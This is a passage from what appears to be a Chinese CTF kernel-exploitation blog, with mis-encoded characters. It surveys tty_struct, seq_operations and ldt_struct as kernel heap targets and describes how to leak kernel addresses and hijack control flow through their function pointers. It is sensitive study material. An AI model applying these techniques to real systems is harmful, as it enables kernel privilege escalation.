class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æ³„éœ²"><a href="#æ•°æ®æ³„éœ²" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h3><h4 id="å†…æ ¸-text-æ®µåœ°å€"><a href="#å†…æ ¸-text-æ®µåœ°å€" class="headerlink" title="å†…æ ¸ .text æ®µåœ°å€"></a>å†…æ ¸ .text æ®µåœ°å€</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ tty_struct çš„å‡½æ•°è¡¨ <code>tty_operations</code> æ¥æ³„éœ²å†…æ ¸ <code>.text</code> æ®µçš„åœ°å€ï¼š</p><p>åœ¨ ptmx è¢«æ‰“å¼€æ—¶å†…æ ¸é€šè¿‡ <code>alloc_tty_struct()</code> åˆ†é… tty_struct çš„å†…å­˜ç©ºé—´ï¼Œä¹‹åä¼šå°† tty_operations åˆå§‹åŒ–ä¸º<strong>å…¨å±€å˜é‡</strong> <code>ptm_unix98_ops</code> æˆ– <code>pty_unix98_ops </code>ï¼Œåœ¨è°ƒè¯•é˜¶æ®µæˆ‘ä»¬å¯ä»¥å…ˆå…³æ‰ kaslr å¼€ root ä» <code>/proc/kallsyms</code> ä¸­è¯»å–å…¶åç§»</p><p>å¼€å¯äº† kaslr çš„å†…æ ¸åœ¨å†…å­˜ä¸­çš„åç§»ä¾ç„¶ä»¥å†…å­˜é¡µä¸ºç²’åº¦ï¼Œæ•…æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¯”å¯¹ tty_operations åœ°å€çš„ä½ä¸‰16è¿›åˆ¶ä½æ¥åˆ¤æ–­æ˜¯ ptm_unix98_ops è¿˜æ˜¯ pty_unix98_ops</p><h4 id="å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰"><a href="#å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰" class="headerlink" title="*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰"></a><em>*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰</em></h4><p>tty_struct çš„ <code>dev</code> æˆå‘˜ä¸ <code>driver</code> æˆå‘˜éƒ½æ˜¯é€šè¿‡ kmalloc åˆ†é…çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªæˆå‘˜æ³„éœ²å†…æ ¸çº¿æ€§æ˜ å°„åŒºçš„åœ°å€</p><blockquote><p>ç¬”è€…ç›®å‰æš‚æ—¶è¿˜æ²¡æ‰¾åˆ°é€šè¿‡è¯¥ç»“æ„æ³„éœ² page_offset_base çš„æ–¹æ³•</p></blockquote><h3 id="åŠ«æŒå†…æ ¸æ‰§è¡Œæµ"><a href="#åŠ«æŒå†…æ ¸æ‰§è¡Œæµ" class="headerlink" title="åŠ«æŒå†…æ ¸æ‰§è¡Œæµ"></a>åŠ«æŒå†…æ ¸æ‰§è¡Œæµ</h3><p>è‹¥æˆ‘ä»¬èƒ½å¤ŸåŠ«æŒç›¸åº” tty è®¾å¤‡ï¼ˆä¾‹å¦‚ &#x2F;dev&#x2F;ptmxï¼‰çš„ <code>tty_struct</code> ç»“æ„ä½“ä¸å…¶å†…éƒ¨çš„ <code>tty_operations</code> å‡½æ•°è¡¨ï¼Œé‚£ä¹ˆåœ¨æˆ‘ä»¬å¯¹è¿™ä¸ªè®¾å¤‡è¿›è¡Œç›¸åº”æ“ä½œï¼ˆå¦‚writeã€ioctlï¼‰æ—¶ä¾¿ä¼šæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®å¥½çš„æ¶æ„å‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼ˆä¾‹å¦‚<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Auserfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass">å¼ºç½‘æ¯2021-noteook</a>)</p><h1 id="0x02-seq-file-ç›¸å…³"><a href="#0x02-seq-file-ç›¸å…³" class="headerlink" title="0x02.seq_file ç›¸å…³"></a>0x02.seq_file ç›¸å…³</h1><p><strong>åºåˆ—æ–‡ä»¶æ¥å£</strong>ï¼ˆSequence File Interfaceï¼‰æ˜¯é’ˆå¯¹ procfs é»˜è®¤æ“ä½œå‡½æ•°æ¯æ¬¡åªèƒ½è¯»å–ä¸€é¡µæ•°æ®ä»è€Œéš¾ä»¥å¤„ç†è¾ƒå¤§ proc æ–‡ä»¶çš„æƒ…å†µä¸‹å‡ºç°çš„ï¼Œå…¶ä¸ºå†…æ ¸ç¼–ç¨‹æä¾›äº†æ›´ä¸ºå‹å¥½çš„æ¥å£</p><h2 id="seq-file"><a href="#seq-file" class="headerlink" title="seq_file"></a>seq_file</h2><p>ä¸ºäº†ç®€åŒ–æ“ä½œï¼Œåœ¨å†…æ ¸ <code>seq_file</code> ç³»åˆ—æ¥å£ä¸­ä¸º file ç»“æ„ä½“æä¾›äº† private data æˆå‘˜ <code>seq_file</code> ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/seq_file.h</code> å½“ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> from;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">    <span class="type">size_t</span> pad_until;</span><br><span class="line">    <span class="type">loff_t</span> index;</span><br><span class="line">    <span class="type">loff_t</span> read_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">    <span class="type">int</span> poll_event;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">void</span> *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„å‡½æ•°è¡¨æˆå‘˜ op åœ¨æ‰“å¼€æ–‡ä»¶æ—¶é€šè¿‡ kmalloc è¿›è¡ŒåŠ¨æ€åˆ†é…</p><h2 id="single-open"><a href="#single-open" class="headerlink" title="single_open"></a>single_open</h2><p> ä¸ºäº†æ›´è¿›ä¸€æ­¥ç®€åŒ–å†…æ ¸æ¥å£çš„å®ç°ï¼Œseq_file æ¥å£æä¾›äº† single_open() è¿™ä¸ªç®€åŒ–çš„åˆå§‹åŒ– file çš„å‡½æ•°ï¼Œå…¶å®šä¹‰äº <code>fs/seq_file.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">single_open</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">int</span> (*show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *),</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span> =</span> kmalloc(<span class="keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="type">int</span> res = -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op) &#123;</span><br><span class="line">        op-&gt;start = single_start;</span><br><span class="line">        op-&gt;next = single_next;</span><br><span class="line">        op-&gt;stop = single_stop;</span><br><span class="line">        op-&gt;show = show;</span><br><span class="line">        res = seq_open(file, op);</span><br><span class="line">        <span class="keyword">if</span> (!res)</span><br><span class="line">            ((<span class="keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            kfree(op);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(single_open);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°çš„æ˜¯åœ¨è¿™é‡Œä½¿ç”¨äº† kmalloc æ¥åˆ†é… seq_operations æ‰€éœ€ç©ºé—´ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æœ‰æœºå¯ä¹˜</p><p>ä½†æ˜¯æˆ‘ä»¬å¾ˆéš¾ç›´æ¥æ“çºµ seq_file ç»“æ„ä½“ï¼Œè¿™æ˜¯å› ä¸ºå…¶æ‰€éœ€ç©ºé—´é€šè¿‡ <code>seq_open()</code> ä¸­è°ƒç”¨ kzalloc ä»å•ç‹¬çš„ <code>seq_file_cache</code> ä¸­åˆ†é…</p><h2 id="seq-operationsï¼ˆkmalloc-32-GFP-KERNEL-ACCOUNTï¼‰ï¼šseq-file-å‡½æ•°è¡¨"><a href="#seq-operationsï¼ˆkmalloc-32-GFP-KERNEL-ACCOUNTï¼‰ï¼šseq-file-å‡½æ•°è¡¨" class="headerlink" title="seq_operationsï¼ˆkmalloc-32 | GFP_KERNEL_ACCOUNTï¼‰ï¼šseq_file å‡½æ•°è¡¨"></a>seq_operationsï¼ˆkmalloc-32 | GFP_KERNEL_ACCOUNTï¼‰ï¼šseq_file å‡½æ•°è¡¨</h2><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/seq_file.h</code> å½“ä¸­ï¼Œåªå®šä¹‰äº†å››ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="åˆ†é…-x2F-é‡Šæ”¾-1"><a href="#åˆ†é…-x2F-é‡Šæ”¾-1" class="headerlink" title="åˆ†é…&#x2F;é‡Šæ”¾"></a>åˆ†é…&#x2F;é‡Šæ”¾</h3><p>å‰é¢æˆ‘ä»¬å¾—çŸ¥é€šè¿‡ single_open() å‡½æ•°å¯ä»¥åˆ†é… seq_operations ç»“æ„ä½“ï¼Œé˜…è¯»å†…æ ¸æºç ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stat_open()        &lt;--- stat_proc_ops.proc_open</span><br><span class="line">    single_open_size()</span><br><span class="line">        single_open()</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ° stat_open() ä¸º procfs ä¸­çš„ stat æ–‡ä»¶å¯¹åº”çš„ proc_ops å‡½æ•°è¡¨ä¸­ open å‡½æ•°å¯¹åº”çš„é»˜è®¤å‡½æ•°æŒ‡é’ˆï¼Œåœ¨å†…æ ¸æºç  <code>fs/proc/stat.c</code> ä¸­æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">stat_proc_ops</span> =</span> &#123;</span><br><span class="line">    .proc_flags    = PROC_ENTRY_PERMANENT,</span><br><span class="line">    .proc_open    = stat_open,</span><br><span class="line">    .proc_read_iter    = seq_read_iter,</span><br><span class="line">    .proc_lseek    = seq_lseek,</span><br><span class="line">    .proc_release    = single_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">proc_stat_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;stat&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;stat_proc_ops);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">fs_initcall(proc_stat_init);</span><br></pre></td></tr></table></figure><p>å³è¯¥æ–‡ä»¶å¯¹åº”çš„æ˜¯ <code>/proc/id/stat</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆåªè¦æˆ‘ä»¬æ‰“å¼€ <code>proc/self/stat</code> æ–‡ä»¶ä¾¿èƒ½åˆ†é…åˆ°æ–°çš„ seq_operations ç»“æ„ä½“</p><p>å¯¹åº”åœ°ï¼Œåœ¨å®šä¹‰äº <code>fs/seq_file.c</code> ä¸­çš„ <code>single_release()</code> ä¸º stat æ–‡ä»¶çš„ proc_ops çš„é»˜è®¤ release æŒ‡é’ˆï¼Œå…¶ä¼šé‡Šæ”¾æ‰å¯¹åº”çš„ seq_operations ç»“æ„ä½“ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦å…³é—­æ–‡ä»¶å³å¯é‡Šæ”¾è¯¥ç»“æ„ä½“</p><h3 id="æ•°æ®æ³„éœ²-1"><a href="#æ•°æ®æ³„éœ²-1" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h3><h4 id="å†…æ ¸-text-æ®µåœ°å€-1"><a href="#å†…æ ¸-text-æ®µåœ°å€-1" class="headerlink" title="å†…æ ¸ .text æ®µåœ°å€"></a>å†…æ ¸ .text æ®µåœ°å€</h4><p>seq_operations ç»“æ„ä½“ä¸­æœ‰ç€å››ä¸ªå†…æ ¸æŒ‡é’ˆï¼ˆç¬”è€…å°šæœªæ±‚è¯å…·ä½“æ˜¯ä»€ä¹ˆå‡½æ•°ï¼‰ï¼Œè‹¥æ˜¯èƒ½å¤Ÿè¯»å‡ºè¿™äº›æŒ‡é’ˆçš„å€¼æˆ‘ä»¬ä¾¿æ¯«æ— ç–‘é—®èƒ½æ³„éœ²å‡ºå†…æ ¸ .text æ®µçš„åŸºå€</p><h3 id="åŠ«æŒå†…æ ¸æ‰§è¡Œæµ-1"><a href="#åŠ«æŒå†…æ ¸æ‰§è¡Œæµ-1" class="headerlink" title="åŠ«æŒå†…æ ¸æ‰§è¡Œæµ"></a>åŠ«æŒå†…æ ¸æ‰§è¡Œæµ</h3><p>å½“æˆ‘ä»¬ read ä¸€ä¸ª stat æ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨å…¶ proc_ops çš„ <code>proc_read_iter</code> æŒ‡é’ˆï¼Œå…¶é»˜è®¤å€¼ä¸º <code>seq_read_iter()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>fs/seq_file.c</code> ä¸­ï¼Œæ³¨æ„åˆ°æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>å³å…¶ä¼šè°ƒç”¨ seq_operations ä¸­çš„ start å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆ<strong>æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ seq_operations-&gt;start åå†è¯»å–å¯¹åº” stat æ–‡ä»¶ä¾¿èƒ½æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</strong>ï¼ˆä¾‹å¦‚ <a href="https://www.anquanke.com/post/id/258160">InCTF 2021 - Kqueue</a>ï¼‰</p><h1 id="0x03-ldt-struct-ä¸-modify-ldt-ç³»ç»Ÿè°ƒç”¨"><a href="#0x03-ldt-struct-ä¸-modify-ldt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="0x03.ldt_struct ä¸ modify_ldt ç³»ç»Ÿè°ƒç”¨"></a>0x03.ldt_struct ä¸ modify_ldt ç³»ç»Ÿè°ƒç”¨</h1><p>ldt å³<strong>å±€éƒ¨æ®µæè¿°ç¬¦è¡¨</strong>ï¼ˆ<strong>Local Descriptor Table</strong>ï¼‰ï¼Œå…¶ä¸­å­˜æ”¾ç€<strong>è¿›ç¨‹çš„</strong>æ®µæè¿°ç¬¦ï¼Œæ®µå¯„å­˜å™¨å½“ä¸­å­˜æ”¾ç€çš„æ®µé€‰æ‹©å­ä¾¿æ˜¯æ®µæè¿°ç¬¦è¡¨ä¸­æ®µæè¿°ç¬¦çš„ç´¢å¼•ï¼Œåœ¨å†…æ ¸ä¸­ä¸ ldt ç›¸å…³è”çš„ç»“æ„ä½“ä¸º ldt_struct</p><p>åœ¨ TCTF&#x2F;0CTF 2021 FINAL å½“ä¸­ç”± <a href="https://github.com/yzloser">yzloser å¸ˆå‚…</a>å±•ç¤ºç»™æˆ‘ä»¬çš„ä¸€ç§_ååˆ†ç¾å¦™çš„åˆ©ç”¨æ–¹å¼_â€”â€”é€šè¿‡ modify_ldt ç³»ç»Ÿè°ƒç”¨æ¥æ“çºµå†…æ ¸ä¸­çš„ ldt_struct ä»¥è¿›è¡Œå†…æ ¸ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™</p><p>å®Œæ•´åˆ©ç”¨è¿‡ç¨‹çš„ä¾‹å­å¯ä»¥å‚è§<a href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/">TCTF2021 FINAL - kernote</a></p><h2 id="modify-ldt-ç³»ç»Ÿè°ƒç”¨"><a href="#modify-ldt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="modify_ldt ç³»ç»Ÿè°ƒç”¨"></a>modify_ldt ç³»ç»Ÿè°ƒç”¨</h2><p>è¯¥ç³»ç»Ÿè°ƒç”¨å¯ä»¥ç”¨æ¥æ“çºµå¯¹åº”è¿›ç¨‹çš„ ldt_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ldt-struct-kmalloc-16-slub-x2F-kmalloc-32-slab"><a href="#ldt-struct-kmalloc-16-slub-x2F-kmalloc-32-slab" class="headerlink" title="ldt_struct:  kmalloc-16(slub)&#x2F;kmalloc-32(slab)"></a>ldt_struct:  kmalloc-16(slub)&#x2F;kmalloc-32(slab)</h2><p>è¯¥ç»“æ„ä½“å®šä¹‰äºå†…æ ¸æºç  <code>arch/x86/include/asm/mmu_context.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">     * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">     * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">     * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">     * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">     * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="åˆ†é…ï¼ˆGFP-KERNELï¼‰ï¼šmodify-ldt-ç³»ç»Ÿè°ƒç”¨â€”â€”write-ldt"><a 